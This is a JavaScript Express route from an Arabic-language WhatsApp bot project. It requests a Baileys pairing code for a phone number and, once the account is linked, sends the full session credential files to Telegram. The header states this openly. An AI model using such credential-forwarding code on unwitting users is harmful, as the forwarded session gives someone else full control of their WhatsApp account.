/**
 * ═══════════════════════════════════════════════════════
 * 🔢 PAIR CODE | ربط برقم الهاتف
 * ═══════════════════════════════════════════════════════
 * 👑 المطور: آدم (شادو) | Adam (Shadow)
 * 🤖 البوت: سوكونا | Sukuna
 * 🏷️ الحقوق: ${global.author}
 * 📜 الوصف: توليد كود ربط Pairing Code وإرسال الجلسة للتليجرام
 * ═══════════════════════════════════════════════════════
 */

import express from 'express';
import fs from 'fs';
import pino from 'pino';
import { 
  makeWASocket, 
  useMultiFileAuthState, 
  delay, 
  makeCacheableSignalKeyStore, 
  Browsers, 
  fetchLatestBaileysVersion 
} from '@whiskeysockets/baileys';
import pn from 'awesome-phonenumber';
import { sendSessionToTelegram } from './lib/sender.js';

const router = express.Router();

function removeFile(FilePath) {
  try {
    if (!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true });
  } catch (e) {
    console.error('Error removing file:', e);
  }
}

router.get('/', async (req, res) => {
  let num = req.query.number;
  if (!num) return res.status(400).send({ code: 'No number provided' });

  num = num.replace(/[^0-9]/g, '');
  const phone = pn('+' + num);
  if (!phone.isValid()) {
    return res.status(400).send({ code: 'Invalid phone number' });
  }
  num = phone.getNumber('e164').replace('+', '');

  const dirs = `./temp_sessions/${num}`;
  await removeFile(dirs);
  if (!fs.existsSync('./temp_sessions')) fs.mkdirSync('./temp_sessions', { recursive: true });

  async function initiateSession() {
    const { state, saveCreds } = await useMultiFileAuthState(dirs);
    try {
      const { version } = await fetchLatestBaileysVersion();
      let sock = makeWASocket({
        version,
        auth: {
          creds: state.creds,
          keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "fatal" }).child({ level: "fatal" }),
        browser: Browsers.windows('Chrome'),
        markOnlineOnConnect: false,
        generateHighQualityLinkPreview: false,
        defaultQueryTimeoutMs: 60000,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 30000,
        retryRequestDelayMs: 250,
        maxRetries: 5,
      });

      sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        
        if (connection === 'open') {
          console.log("✅ Connected successfully!");
          try {
            // انتظار حفظ الكريدز
            await delay(2000);
            
            // إرسال الجلسة للتليجرام كنص JSON
            await sendSessionToTelegram(dirs, num);
            
            res.status(200).send({ 
              code: 'SUCCESS', 
              message: 'تم الربط بنجاح وجاري إرسال الجلسة للبوت الرئيسي' 
            });
            
            // تنظيف الملفات المؤقتة
            setTimeout(() => removeFile(dirs), 5000);
          } catch (error) {
            console.error("❌ Error sending session:", error);
            res.status(500).send({ code: 'ERROR', message: 'فشل إرسال الجلسة' });
            removeFile(dirs);
          }
        }

        if (connection === 'close') {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          if (statusCode === 401) {
            console.log("❌ Logged out");
            removeFile(dirs);
          } else {
            console.log("🔁 Connection closed — restarting...");
            initiateSession();
          }
        }
      });

      if (!sock.authState.creds.registered) {
        await delay(3000);
        try {
          let code = await sock.requestPairingCode(num);
          code = code?.match(/.{1,4}/g)?.join('-') || code;
          if (!res.headersSent) {
            res.send({ code });
          }
        } catch (error) {
          console.error('Error requesting pairing code:', error);
          if (!res.headersSent) {
            res.status(503).send({ code: 'Failed to get pairing code' });
          }
        }
      }
      sock.ev.on('creds.update', saveCreds);
    } catch (err) {
      console.error('Error initializing session:', err);
      if (!res.headersSent) {
        res.status(503).send({ code: 'Service Unavailable' });
      }
    }
  }
  await initiateSession();
});

export default router;